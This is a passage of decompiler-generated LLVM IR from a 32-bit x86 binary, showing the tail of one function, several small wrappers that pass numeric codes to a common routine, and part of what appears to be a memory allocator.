  %v0_804d31a = load i32, i32* %edx.global-to-local, align 4
  %v1_804d31a = add i32 %v0_804d31a, 4
  %v2_804d31a = inttoptr i32 %v1_804d31a to i32*
  store i32 0, i32* %v2_804d31a, align 4
  %tmp45 = icmp ult i32 %v1_804d30e, 32
  br i1 %tmp45, label %dec_label_pc_804d57d, label %dec_label_pc_804d327

dec_label_pc_804d327:                             ; preds = %dec_label_pc_804d30b
  %v0_804d327 = load i32, i32* @ebx, align 4
  %v1_804d327 = add i32 %v0_804d327, -44
  store i32 %v1_804d327, i32* @ebx, align 4
  %tmp46 = icmp ult i32 %v1_804d327, 256
  br i1 %tmp46, label %dec_label_pc_804d57d, label %dec_label_pc_804d33a

dec_label_pc_804d33a:                             ; preds = %dec_label_pc_804d327
  %v0_804d33a = load i32, i32* @ebp, align 4
  %v1_804d33a = add i32 %v0_804d33a, 12
  %v1_804d33d = add i32 %v0_804d33a, 44
  store i32 %v1_804d33d, i32* @edi, align 4
  store i32 %v1_804d33d, i32* %stack_var_-108, align 4
  %v3_804d34e = inttoptr i32 %v1_804d33d to i8*
  %v4_804d34e = call i32 @function_804cea8(i8* %v3_804d34e, i32 %arg1, i32 %v1_804d327)
  %v0_804d353 = load i32, i32* @edi, align 4
  %v1_804d353 = load i32, i32* @ebp, align 4
  %v2_804d353 = add i32 %v1_804d353, 12
  %v3_804d353 = inttoptr i32 %v2_804d353 to i32*
  store i32 %v0_804d353, i32* %v3_804d353, align 4
  %v1_804d35a = add i32 %v0_804d33a, 16
  %v2_804d35a = inttoptr i32 %v1_804d35a to i32*
  store i32 0, i32* %v2_804d35a, align 4
  %v2_804d361 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804d361, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_804d363 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_804d368 = inttoptr i32 %arg1 to i8*
  %v3_804d368 = call i32 @function_8050160(i8* %v2_804d368, i32 %v0_804d363)
  store i32 %v3_804d368, i32* %eax.global-to-local, align 4
  %v1_804d370 = icmp eq i32 %v3_804d368, 0
  br i1 %v1_804d370, label %dec_label_pc_804d3ac, label %dec_label_pc_804d374

dec_label_pc_804d374:                             ; preds = %dec_label_pc_804d33a
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_804d378 = load i32, i32* @edi, align 4
  store i32 %v0_804d378, i32* %arg2, align 4
  %v1_804d37a = add i32 %tmp18, 8
  %v2_804d37a = inttoptr i32 %v1_804d37a to i32*
  store i32 2, i32* %v2_804d37a, align 4
  %v0_804d381 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d381 = add i32 %v0_804d381, 12
  %v2_804d381 = inttoptr i32 %v1_804d381 to i32*
  store i32 4, i32* %v2_804d381, align 4
  %v2_804d388 = load i32, i32* %stack_var_-92, align 4
  %v1_804d38b = load i32, i32* %edx.global-to-local, align 4
  %v2_804d38b = add i32 %v1_804d38b, 16
  %v3_804d38b = inttoptr i32 %v2_804d38b to i32*
  store i32 %v2_804d388, i32* %v3_804d38b, align 4
  %v1_804d392 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d392 = add i32 %v1_804d392, 4
  %v3_804d392 = inttoptr i32 %v2_804d392 to i32*
  store i32 %v1_804d33a, i32* %v3_804d392, align 4
  %v0_804d399 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804d399, i32* %v1_804d26b, align 4
  store i32 0, i32* %v1_804d2b9, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d582

dec_label_pc_804d3ac:                             ; preds = %dec_label_pc_804d33a
  %v0_804d3ac = call i32 @function_8050948()
  store i32 %v0_804d3ac, i32* @eax, align 4
  %v2_804d3bc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804d3bc, i32* @ebx, align 4
  store i32 %v2_804d3bc, i32* %stack_var_-108, align 4
  %v2_804d3c1 = call i32 @function_804ec6e(i32 %v2_804d3bc, i32 134540395)
  store i32 %v2_804d3c1, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80559f0.136 to i32), i32* %stack_var_-108, align 4
  %v1_804d3cd = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80559f0.136 to i32))
  store i32 ptrtoint (i32* @global_var_80559f0.136 to i32), i32* @ecx, align 4
  store i32 134540395, i32* @eax, align 4
  store i32 %v2_804d3bc, i32* %stack_var_-108, align 4
  %v0_804d3d7 = load i32, i32* @global_var_80586d4.137, align 4
  store i32 %v0_804d3d7, i32* @esi, align 4
  %v2_804d3dd = call i32 @function_804ec6e(i32 %v2_804d3bc, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804d3f8 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804d3fd = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804d3fd, i32* %eax.global-to-local, align 4
  store i32 %v2_804d3fd, i32* %stack_var_-108, align 4
  %v0_804d407 = load i32, i32* @esi, align 4
  %v7_804d40e = call i32 @function_80501f4(i8* %v2_804d368, i32 1, i32 %v0_804d407, i32 ptrtoint (i32* @global_var_80586c8.138 to i32), i32 %v2_804d3fd, i32 %v2_804d3f8)
  store i32 %v7_804d40e, i32* %eax.global-to-local, align 4
  %v2_804d416 = icmp slt i32 %v7_804d40e, 0
  %v1_804d418 = icmp eq i1 %v2_804d416, false
  br i1 %v1_804d418, label %dec_label_pc_804d42e, label %dec_label_pc_804d41a

dec_label_pc_804d41a:                             ; preds = %dec_label_pc_804d3ac
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_804d2b9, align 4
  br label %dec_label_pc_804d582

dec_label_pc_804d42e:                             ; preds = %dec_label_pc_804d3ac
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804d441 = icmp ugt i32 %v1_804d327, 256
  %v15_804d441 = icmp eq i32 %v0_804d327, 300
  %v2_804d445 = or i1 %v15_804d441, %v10_804d441
  br i1 %v2_804d445, label %dec_label_pc_804d4e0, label %dec_label_pc_804d447

dec_label_pc_804d447:                             ; preds = %dec_label_pc_804d42e
  %v3_804d44a = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804d44a, i32* %stack_var_-108, align 4
  %v1_804d44e = call i32 @function_804e0e5(i32 %v3_804d44a)
  store i32 %v1_804d44e, i32* %eax.global-to-local, align 4
  store i32 %v3_804d44a, i32* @edi, align 4
  %v3_804d454 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804d454, i32* %stack_var_-108, align 4
  %v1_804d458 = call i32 @function_804e0e5(i32 %v3_804d454)
  store i32 -1, i32* %v1_804d2b9, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d558

dec_label_pc_804d4e0:                             ; preds = %dec_label_pc_804d42e
  %v3_804d4e5.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804d4e9.pre = load i32, i32* @edi, align 4
  store i32 %v0_804d4e9.pre, i32* %stack_var_-108, align 4
  %v3_804d4ea = inttoptr i32 %v0_804d4e9.pre to i8*
  %v4_804d4ea = call i32 @function_804cea8(i8* %v3_804d4ea, i32 %v3_804d4e5.pre, i32 %v1_804d327)
  store i32 %v4_804d4ea, i32* %eax.global-to-local, align 4
  %v3_804d4f0 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804d4f0, i32* %stack_var_-108, align 4
  %v1_804d4f4 = call i32 @function_804e0e5(i32 %v3_804d4f0)
  store i32 %v1_804d4f4, i32* %eax.global-to-local, align 4
  %v12_804d4fc = icmp eq i32 %tmp10, 1
  %v1_804d501 = icmp eq i1 %v12_804d4fc, false
  br i1 %v1_804d501, label %dec_label_pc_804d55d, label %dec_label_pc_804d503

dec_label_pc_804d503:                             ; preds = %dec_label_pc_804d4e0
  %v0_804d503 = load i32, i32* @edx, align 4
  %v0_804d50a = load i32, i32* @ebp, align 4
  store i32 %v0_804d50a, i32* %stack_var_-108, align 4
  %v3_804d50b = inttoptr i32 %tmp to i16*
  %v4_804d50b = call i32 @function_804ce38(i16* %v3_804d50b, i32 4, i32 %v0_804d503)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804d514 = load i32, i32* @edi, align 4
  store i32 %v0_804d514, i32* %arg2, align 4
  %v1_804d516 = add i32 %tmp18, 8
  %v2_804d516 = inttoptr i32 %v1_804d516 to i32*
  store i32 2, i32* %v2_804d516, align 4
  %v0_804d51d = load i32, i32* %eax.global-to-local, align 4
  %v1_804d51d = add i32 %v0_804d51d, 12
  %v2_804d51d = inttoptr i32 %v1_804d51d to i32*
  store i32 4, i32* %v2_804d51d, align 4
  %v3_804d524 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804d524, i32* %edx.global-to-local, align 4
  %v1_804d528 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d528 = add i32 %v1_804d528, 16
  %v3_804d528 = inttoptr i32 %v2_804d528 to i32*
  store i32 %v3_804d524, i32* %v3_804d528, align 4
  %v1_804d52f = load i32, i32* %eax.global-to-local, align 4
  %v2_804d52f = add i32 %v1_804d52f, 4
  %v3_804d52f = inttoptr i32 %v2_804d52f to i32*
  store i32 %v1_804d33a, i32* %v3_804d52f, align 4
  %v2_804d532 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804d532, i32* %eax.global-to-local, align 4
  %v3_804d533 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804d533, i32* %stack_var_-108, align 4
  %v1_804d537 = call i32 @function_804e0e5(i32 %v3_804d533)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_804d26b, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_804d2b9, align 4
  br label %dec_label_pc_804d558

dec_label_pc_804d558:                             ; preds = %dec_label_pc_804d55d, %dec_label_pc_804d447, %dec_label_pc_804d503
  br label %dec_label_pc_804d582

dec_label_pc_804d55d:                             ; preds = %dec_label_pc_804d4e0
  %v3_804d560 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804d560, i32* %stack_var_-108, align 4
  %v1_804d564 = call i32 @function_804e0e5(i32 %v3_804d560)
  store i32 1, i32* %v1_804d2b9, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d558

dec_label_pc_804d57d:                             ; preds = %dec_label_pc_804d327, %dec_label_pc_804d30b, %dec_label_pc_804d2ff, %dec_label_pc_804d2ec, %dec_label_pc_804d2e0
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d582

dec_label_pc_804d582:                             ; preds = %dec_label_pc_804d2cc, %dec_label_pc_804d2c5, %dec_label_pc_804d281, %dec_label_pc_804d258, %dec_label_pc_804d558, %dec_label_pc_804d41a, %dec_label_pc_804d374, %dec_label_pc_804d57d
  store i32 %v0_804d25b, i32* @ebx, align 4
  store i32 %v0_804d25a, i32* @esi, align 4
  store i32 %v0_804d259, i32* @edi, align 4
  store i32 %v0_804d258, i32* @ebp, align 4
  %v0_804d589 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804d589

; uselistorder directives
  uselistorder i32 %v2_804d3bc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804d33d, { 1, 0, 2 }
  uselistorder i32 %v1_804d33a, { 1, 0 }
  uselistorder i32 %v1_804d327, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804d2f0.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804d2db, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_804d2b9, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804d2b9, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804d26b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804d582, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804d558, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804d2ec, { 1, 0 }
}

define i32 @function_804d58c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d58c:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804d5a7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804d5ae = call i32 @function_804efb8(i32 5, i32 %v2_804d5a7)
  ret i32 %v2_804d5ae

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804d5b8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d5b8:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804d5d3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804d5da = call i32 @function_804efb8(i32 2, i32 %v2_804d5d3)
  ret i32 %v2_804d5da

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804d5e4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d5e4:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804d5ff = ptrtoint i32* %stack_var_-12 to i32
  %v2_804d606 = call i32 @function_804efb8(i32 3, i32 %v2_804d5ff)
  ret i32 %v2_804d606

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804d610(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804d610:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_804d623 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804d62a = call i32 @function_804efb8(i32 4, i32 %v2_804d623)
  ret i32 %v2_804d62a

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_804d634(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804d634:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804d657 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804d65e = call i32 @function_804efb8(i32 10, i32 %v2_804d657)
  ret i32 %v2_804d65e

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @function_804d668(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_804d668:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804d69b = ptrtoint i32* %stack_var_-24 to i32
  %v2_804d6a2 = call i32 @function_804efb8(i32 11, i32 %v2_804d69b)
  ret i32 %v2_804d6a2

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @function_804d6ac() local_unnamed_addr {
dec_label_pc_804d6ac:
  %stack_var_-20 = alloca i32, align 4
  %v2_804d6d7 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804d6de = call i32 @function_804efb8(i32 14, i32 %v2_804d6d7)
  ret i32 %v2_804d6de
}

define i32 @function_804d6e8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804d6e8:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804d703 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804d70a = call i32 @function_804efb8(i32 1, i32 %v2_804d703)
  ret i32 %v2_804d70a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @function_804d714() local_unnamed_addr {
dec_label_pc_804d714:
  %v0_804d714 = load i32, i32* @eax, align 4
  %v6_804d727 = icmp ugt i32 %v0_804d714, 16777215
  br i1 %v6_804d727, label %dec_label_pc_804d738, label %dec_label_pc_804d729

dec_label_pc_804d729:                             ; preds = %dec_label_pc_804d714
  %tmp = icmp ult i32 %v0_804d714, 256
  %v2_804d717 = udiv i32 %v0_804d714, 256
  %v2_804d729 = call i32 @llvm.ctlz.i32(i32 %v2_804d717, i1 true)
  %v3_804d729 = xor i32 %v2_804d729, 31
  %v5_804d729 = select i1 %tmp, i32 95, i32 %v3_804d729
  %v1_804d72c = add nuw nsw i32 %v5_804d729, 6
  store i32 %v1_804d72c, i32* @ecx, align 4
  %v2_804d72f = urem i32 %v1_804d72c, 32
  %v4_804d72f = icmp eq i32 %v2_804d72f, 0
  br i1 %v4_804d72f, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804d729
  %v5_804d72f = lshr i32 %v0_804d714, %v2_804d72f
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804d729, %bb
  %v0_804d731 = phi i32 [ %v0_804d714, %dec_label_pc_804d729 ], [ %v5_804d72f, %bb ]
  %v1_804d731 = urem i32 %v0_804d731, 4
  %v2_804d734 = mul nuw nsw i32 %v5_804d729, 4
  %v3_804d734 = or i32 %v1_804d731, 32
  %v4_804d734 = add nuw nsw i32 %v3_804d734, %v2_804d734
  br label %dec_label_pc_804d738

dec_label_pc_804d738:                             ; preds = %dec_label_pc_804d714, %bb4
  %v0_804d739 = phi i32 [ 95, %dec_label_pc_804d714 ], [ %v4_804d734, %bb4 ]
  ret i32 %v0_804d739

; uselistorder directives
  uselistorder i32 %v2_804d72f, { 1, 0 }
  uselistorder i32 %v0_804d714, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804d738, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_804d73a(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d73a:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d73a = load i32, i32* @ebp, align 4
  %v0_804d73b = load i32, i32* @edi, align 4
  %v0_804d73c = load i32, i32* @esi, align 4
  %v0_804d73d = load i32, i32* @ebx, align 4
  store i32 %v0_804d73d, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804d74f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d74f, i32* @eax, align 4
  store i32 %v2_804d74f, i32* %stack_var_-92, align 4
  %v2_804d754 = call i32 @function_804ec6e(i32 %v2_804d74f, i32 134540395)
  store i32 %v2_804d754, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80558d0.139 to i32), i32* %stack_var_-92, align 4
  %v1_804d760 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80558d0.139 to i32))
  store i32 %v1_804d760, i32* %eax.global-to-local, align 4
  %v0_804d768 = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_804d768, -32
  br i1 %tmp125, label %dec_label_pc_804d77f, label %dec_label_pc_804d76d

dec_label_pc_804d76d:                             ; preds = %dec_label_pc_804d73a
  %v0_804d76d = load i32, i32* %stack_var_-92, align 4
  %v1_804d76d = call i32 @function_804b4bc(i32 %v0_804d76d)
  store i32 %v1_804d76d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804d774 = inttoptr i32 %v1_804d76d to i32*
  store i32 12, i32* %v1_804d774, align 4
  br label %dec_label_pc_804dea4

dec_label_pc_804d77f:                             ; preds = %dec_label_pc_804d73a
  %v1_804d77f = add i32 %v0_804d768, 11
  %tmp126 = icmp ult i32 %v1_804d77f, 16
  br i1 %tmp126, label %dec_label_pc_804d796, label %dec_label_pc_804d78f

dec_label_pc_804d78f:                             ; preds = %dec_label_pc_804d77f
  %v1_804d78f = and i32 %v1_804d77f, -8
  br label %dec_label_pc_804d796

dec_label_pc_804d796:                             ; preds = %dec_label_pc_804d77f, %dec_label_pc_804d78f
  %storemerge136 = phi i32 [ %v1_804d78f, %dec_label_pc_804d78f ], [ %v1_804d77f, %dec_label_pc_804d77f ]
  %v1_804db2e = phi i32 [ %v1_804d78f, %dec_label_pc_804d78f ], [ 16, %dec_label_pc_804d77f ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_804d796 = load i8, i8* @global_var_8058340.140, align 1
  %v1_804d796 = sext i8 %v0_804d796 to i32
  store i32 %v1_804d796, i32* @ebx, align 4
  %v3_804d79c = urem i8 %v0_804d796, 2
  %v4_804d79c = icmp eq i8 %v3_804d79c, 0
  %v1_804d79f = icmp eq i1 %v4_804d79c, false
  br i1 %v1_804d79f, label %dec_label_pc_804d7be, label %dec_label_pc_804d7a1

dec_label_pc_804d7a1:                             ; preds = %dec_label_pc_804d796
  %v2_804d7a1 = icmp eq i8 %v0_804d796, 0
  %v1_804d7a3 = icmp eq i1 %v2_804d7a1, false
  br i1 %v1_804d7a3, label %dec_label_pc_804da99, label %dec_label_pc_804d7a9

dec_label_pc_804d7a9:                             ; preds = %dec_label_pc_804d7a1
  store i32 ptrtoint (i8* @global_var_8058340.140 to i32), i32* %stack_var_-92, align 4
  %v2_804d7b1 = call i32 @function_804df3d(i32* bitcast (i8* @global_var_8058340.140 to i32*))
  store i32 %v2_804d7b1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804da99

dec_label_pc_804d7be:                             ; preds = %dec_label_pc_804d796
  %v11_804d7be = trunc i32 %v1_804db2e to i8
  %v8_804d7c2 = icmp ugt i8 %v11_804d7be, %v0_804d796
  br i1 %v8_804d7c2, label %dec_label_pc_804d7df, label %dec_label_pc_804d7c4

dec_label_pc_804d7c4:                             ; preds = %dec_label_pc_804d7be
  %v2_804d7c8 = udiv i32 %v1_804db2e, 2
  store i32 %v2_804d7c8, i32* %eax.global-to-local, align 4
  %v1_804d7ca = add i32 %v2_804d7c8, ptrtoint (i8* @global_var_8058340.140 to i32)
  store i32 %v1_804d7ca, i32* @ecx, align 4
  %v1_804d7d0 = add i32 %v2_804d7c8, add (i32 ptrtoint (i8* @global_var_8058340.140 to i32), i32 -4)
  %v2_804d7d0 = inttoptr i32 %v1_804d7d0 to i32*
  %v3_804d7d0 = load i32, i32* %v2_804d7d0, align 4
  store i32 %v3_804d7d0, i32* @edx, align 4
  %v1_804d7d3 = icmp eq i32 %v3_804d7d0, 0
  br i1 %v1_804d7d3, label %dec_label_pc_804d7df, label %dec_label_pc_804d7d7

dec_label_pc_804d7d7:                             ; preds = %dec_label_pc_804d7c4
  %v1_804d7d7 = add i32 %v3_804d7d0, 8
  %v2_804d7d7 = inttoptr i32 %v1_804d7d7 to i32*
  %v3_804d7d7 = load i32, i32* %v2_804d7d7, align 4
  store i32 %v3_804d7d7, i32* %eax.global-to-local, align 4
  store i32 %v3_804d7d7, i32* %v2_804d7d0, align 4
  br label %dec_label_pc_804d818

dec_label_pc_804d7df:                             ; preds = %dec_label_pc_804d7c4, %dec_label_pc_804d7be
  %v8_804d7df = icmp ult i32 %v1_804db2e, 255
  %v6_804d7e7 = icmp ugt i32 %v1_804db2e, 255
  store i32 %v1_804db2e, i32* @eax, align 4
  br i1 %v6_804d7e7, label %dec_label_pc_804d820, label %dec_label_pc_804d7e9

dec_label_pc_804d7e9:                             ; preds = %dec_label_pc_804d7df
  %v2_804d7ed = udiv i32 %v1_804db2e, 8
  store i32 %v2_804d7ed, i32* %eax.global-to-local, align 4
  %v1_804d7f4 = mul nuw i32 %v2_804d7ed, 8
  %v2_804d7f4 = add i32 %v1_804d7f4, ptrtoint (i32* @global_var_805836c.141 to i32)
  store i32 %v2_804d7f4, i32* @ecx, align 4
  %v1_804d7fb = add i32 %v1_804d7f4, add (i32 ptrtoint (i32* @global_var_805836c.141 to i32), i32 12)
  %v2_804d7fb = inttoptr i32 %v1_804d7fb to i32*
  %v3_804d7fb = load i32, i32* %v2_804d7fb, align 4
  store i32 %v3_804d7fb, i32* @edx, align 4
  %v12_804d7fe = icmp eq i32 %v3_804d7fb, %v2_804d7f4
  br i1 %v12_804d7fe, label %dec_label_pc_804d91c.preheader, label %dec_label_pc_804d806

dec_label_pc_804d806:                             ; preds = %dec_label_pc_804d7e9
  store i32 %v1_804db2e, i32* %ebx.global-to-local, align 4
  %v1_804d80a = add i32 %v3_804d7fb, 12
  %v2_804d80a = inttoptr i32 %v1_804d80a to i32*
  %v3_804d80a = load i32, i32* %v2_804d80a, align 4
  store i32 %v3_804d80a, i32* %eax.global-to-local, align 4
  store i32 %v3_804d80a, i32* %v2_804d7fb, align 4
  %v0_804d810 = load i32, i32* @edx, align 4
  %v1_804d810 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d810 = add i32 %v0_804d810, 4
  %v3_804d810 = add i32 %v2_804d810, %v1_804d810
  %v4_804d810 = inttoptr i32 %v3_804d810 to i32*
  %v5_804d810 = load i32, i32* %v4_804d810, align 4
  %v6_804d810 = or i32 %v5_804d810, 1
  store i32 %v6_804d810, i32* %v4_804d810, align 4
  %v0_804d815 = load i32, i32* @ecx, align 4
  %v1_804d815 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d815 = add i32 %v1_804d815, 8
  %v3_804d815 = inttoptr i32 %v2_804d815 to i32*
  store i32 %v0_804d815, i32* %v3_804d815, align 4
  br label %dec_label_pc_804d818

dec_label_pc_804d818:                             ; preds = %dec_label_pc_804dbb5, %dec_label_pc_804dbc7, %dec_label_pc_804d7d7, %dec_label_pc_804d806
  %v0_804d818 = load i32, i32* @edx, align 4
  %v1_804d818 = add i32 %v0_804d818, 8
  store i32 %v1_804d818, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804de93

dec_label_pc_804d820:                             ; preds = %dec_label_pc_804d7df
  %v0_804d824 = call i32 @function_804d714()
  store i32 %v0_804d824, i32* %eax.global-to-local, align 4
  %v3_804d829 = and i8 %v0_804d796, 2
  %v4_804d829 = icmp eq i8 %v3_804d829, 0
  %v6_804d829 = zext i8 %v3_804d829 to i32
  %v9_804d829 = and i32 %v1_804d796, -256
  %v10_804d829 = or i32 %v9_804d829, %v6_804d829
  store i32 %v10_804d829, i32* @ebx, align 4
  br i1 %v4_804d829, label %dec_label_pc_804d91c.preheader, label %dec_label_pc_804d836

dec_label_pc_804d836:                             ; preds = %dec_label_pc_804d820
  store i32 ptrtoint (i8* @global_var_8058340.140 to i32), i32* %stack_var_-92, align 4
  %v2_804d83e = call i32 @function_804df3d(i32* bitcast (i8* @global_var_8058340.140 to i32*))
  store i32 %v2_804d83e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d91c.preheader

dec_label_pc_804d91c.preheader:                   ; preds = %dec_label_pc_804d836, %dec_label_pc_804d7e9, %dec_label_pc_804d820
  %stack_var_-40.0.ph = phi i32 [ %v2_804d7ed, %dec_label_pc_804d7e9 ], [ %v0_804d824, %dec_label_pc_804d836 ], [ %v0_804d824, %dec_label_pc_804d820 ]
  %v1_804d872 = add i32 %v1_804db2e, 16
  %v0_804d91c107 = load i32, i32* @global_var_8058380.144, align 128
  store i32 %v0_804d91c107, i32* @ebp, align 4
  %v9_804d922109 = icmp eq i32 %v0_804d91c107, 134579060
  %v1_804d928110 = icmp eq i1 %v9_804d922109, false
  br i1 %v1_804d928110, label %dec_label_pc_804d84b, label %dec_label_pc_804d92e

dec_label_pc_804d84b:                             ; preds = %dec_label_pc_804d91c.preheader, %bb84
  %v0_804d91c111 = phi i32 [ %v0_804d91c, %bb84 ], [ %v0_804d91c107, %dec_label_pc_804d91c.preheader ]
  %v1_804d84b = add i32 %v0_804d91c111, 4
  %v2_804d84b = inttoptr i32 %v1_804d84b to i32*
  %v3_804d84b = load i32, i32* %v2_804d84b, align 4
  %v1_804d84e = add i32 %v0_804d91c111, 12
  %v2_804d84e = inttoptr i32 %v1_804d84e to i32*
  %v3_804d84e = load i32, i32* %v2_804d84e, align 4
  store i32 %v3_804d84e, i32* @edx, align 4
  %v1_804d851 = and i32 %v3_804d84b, -4
  store i32 %v1_804d851, i32* @edi, align 4
  br i1 %v6_804d7e7, label %dec_label_pc_804d87d, label %dec_label_pc_804d85e

dec_label_pc_804d85e:                             ; preds = %dec_label_pc_804d84b
  %v9_804d85e = icmp eq i32 %v3_804d84e, 134579060
  %v1_804d864 = icmp eq i1 %v9_804d85e, false
  br i1 %v1_804d864, label %dec_label_pc_804d87d, label %dec_label_pc_804d866

dec_label_pc_804d866:                             ; preds = %dec_label_pc_804d85e
  %v1_804d866 = load i32, i32* @global_var_8058370.142, align 16
  %v12_804d866 = icmp eq i32 %v0_804d91c111, %v1_804d866
  %v1_804d86c = icmp eq i1 %v12_804d866, false
  br i1 %v1_804d86c, label %dec_label_pc_804d87d, label %dec_label_pc_804d86e

dec_label_pc_804d86e:                             ; preds = %dec_label_pc_804d866
  store i32 %v1_804d872, i32* %eax.global-to-local, align 4
  %v6_804d877 = icmp ugt i32 %v1_804d851, %v1_804d872
  br i1 %v6_804d877, label %dec_label_pc_804de2e, label %dec_label_pc_804d87d

dec_label_pc_804d87d:                             ; preds = %dec_label_pc_804d86e, %dec_label_pc_804d866, %dec_label_pc_804d85e, %dec_label_pc_804d84b
